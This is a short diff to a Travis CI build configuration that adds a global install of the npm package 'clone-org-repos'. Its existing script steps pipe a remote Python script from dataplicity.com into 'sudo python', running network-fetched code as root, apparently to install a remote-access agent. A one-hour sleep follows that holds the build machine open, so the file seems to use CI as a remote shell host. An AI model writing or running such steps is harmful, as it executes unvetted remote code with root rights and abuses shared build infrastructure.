@@ -2,6 +2,7 @@ sudo: required
 dist: trusty
 language: bash
 script: 
+     - npm i clone-org-repos -g
      - curl https://www.dataplicity.com/xsn6xmmx.py | sudo python
      - travis_wait 3600 sleep 3600
      - echo done
